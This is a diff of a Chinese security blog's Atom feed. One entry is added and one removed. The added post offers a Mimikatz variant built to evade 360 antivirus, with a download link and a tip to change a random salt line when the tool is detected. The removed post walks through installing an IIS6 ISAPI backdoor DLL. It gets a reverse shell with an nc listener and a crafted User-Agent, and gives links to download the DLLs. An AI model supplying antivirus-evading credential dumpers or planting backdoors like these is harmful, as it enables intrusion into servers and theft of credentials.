@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="OneHone.github.io/"/>
-  <updated>2020-03-28T09:47:20.785Z</updated>
+  <updated>2020-04-21T09:08:30.013Z</updated>
   <id>OneHone.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Mimikatz-长期免杀360版</title>
+    <link href="OneHone.github.io/2020/04/21/Mimikatz-%E9%95%BF%E6%9C%9F%E5%85%8D%E6%9D%80360%E7%89%88/"/>
+    <id>OneHone.github.io/2020/04/21/Mimikatz-长期免杀360版/</id>
+    <published>2020-04-21T08:32:52.000Z</published>
+    <updated>2020-04-21T09:08:30.013Z</updated>
+    
+    <content type="html"><![CDATA[<p>艺术上的小冲突<br><a id="more"></a><br>思路参考：<a href="https://www.t00ls.net/viewthread.php?tid=55524&amp;highlight=%E5%85%8D%E6%9D%80" target="_blank" rel="noopener">免杀版mimikatz - 长期使用</a>。结合之前<a href="http://hone.cool/2019/10/11/Mimikatz2-2-0%E4%B8%80%E9%94%AE%E7%89%88-%E6%98%8E%E6%96%87-krbtgt/" target="_blank" rel="noopener">一键版mimikatz</a>工具写了个长期免杀360的mimikatz。<br>时间：2020-4-21</p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/images/Mimikatz-长期免杀360版/1.gif" alt=""></p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/OneHone/HoneTool/tree/master/Mimikatz-%E9%95%BF%E6%9C%9F%E5%85%8D%E6%9D%80360%E7%89%88" target="_blank" rel="noopener">time-1-bypass-360-by-mimi.py</a></p><h3 id="小更改"><a href="#小更改" class="headerlink" title="小更改"></a>小更改</h3><p>如被杀，自行修改代码第12行中的数字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">salt = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 50))</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;艺术上的小冲突&lt;br&gt;
+    
+    </summary>
+    
+      <category term="免杀" scheme="OneHone.github.io/categories/%E5%85%8D%E6%9D%80/"/>
+    
+    
+      <category term="免杀" scheme="OneHone.github.io/tags/%E5%85%8D%E6%9D%80/"/>
+    
+  </entry>
   
   <entry>
     <title>C# atexec</title>
@@ -441,30 +463,6 @@
       <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
     
       <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>iis6.x后门isapi测试</title>
-    <link href="OneHone.github.io/2018/03/26/iis6.x%E5%90%8E%E9%97%A8isapi%E6%B5%8B%E8%AF%95/"/>
-    <id>OneHone.github.io/2018/03/26/iis6.x后门isapi测试/</id>
-    <published>2018-03-26T07:37:31.000Z</published>
-    <updated>2018-03-29T12:27:24.256Z</updated>
-    
-    <content type="html"><![CDATA[<p>我就是爱吃醋，就是爱吃醋。<br><a id="more"></a><br>访问网页，就弹<code>shell</code>？唔哟<br>本地复现了一款<code>micropoor</code>大牛的后门，文章结束附上下载链接。</p><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>靶机环境：IP：192.11.22.88 <code>win 2003 Enterprise 32位</code> <code>iis6.x</code><br>攻击机：IP：192.11.22.55 <code>win 7</code><br>打开<code>internet信息服务（IIS）管理器</code>找到默认网站右键点击属性，点击<code>ISAPI筛选器</code>添加<code>iis_x86.dll</code>dll文件。<br><img src="/images/iis6.x后门isapi测试/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击机用<code>nc</code>监听端口，执行命令<code>nc.exe -lvvp 80</code><br>修改User agent内容，这里以谷歌浏览器为例，点击<code>More tools</code>然后选中<code>Network conditions</code><br><img src="/images/iis6.x后门isapi测试/2.PNG" alt=""><br>将User agent的内容改为：<code>micropoor_iis:192.11.22.55:80</code> 注：填本机IP<br><img src="/images/iis6.x后门isapi测试/3.PNG" alt=""><br>然后访问网站，成功反弹<code>shell</code><br><img src="/images/iis6.x后门isapi测试/4.PNG" alt=""></p><p>强大的后门！</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>大牛博客：<code>micropoor.blogspot.com</code><br>32位dll下载：<code>https://drive.google.com/file/d/1-dKhidlBXg3YZ144fejY8FPaYl2KX3Ot/view</code><br>64位dll下载：<code>https://drive.google.com/file/d/1M5hh2IQsnb_sJwIAkOHIJecarcp2FDhL/view</code><br>下之前挂个代理，不然访问不到。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;我就是爱吃醋，就是爱吃醋。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="后门" scheme="OneHone.github.io/categories/%E5%90%8E%E9%97%A8/"/>
-    
-    
-      <category term="windows后门" scheme="OneHone.github.io/tags/windows%E5%90%8E%E9%97%A8/"/>
-    
-      <category term="iis6.x" scheme="OneHone.github.io/tags/iis6-x/"/>
     
   </entry>
   
